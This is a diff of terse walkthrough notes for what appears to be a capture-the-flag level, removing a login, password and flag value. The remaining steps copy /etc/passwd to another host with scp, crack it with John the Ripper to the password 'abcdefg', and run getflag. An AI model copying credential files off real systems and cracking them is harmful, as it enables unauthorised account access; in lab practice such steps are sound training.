@@ -1,8 +1,6 @@
-- Connect with login: "level01" and password: "x24ti5gi3x0ol2eh4esiuxias"
 - time to use john the ripper
-- scp /etc/passwd herrfalco@192.168.1.?:/?
-- john passwd --show
+- scp /etc/passwd herrfalco@192.168.1.?:/tmp
+- john passwd
 	abcdefg
 - log to flag01
 - getflag
-	f2av5il02puano7naaf6adaaf
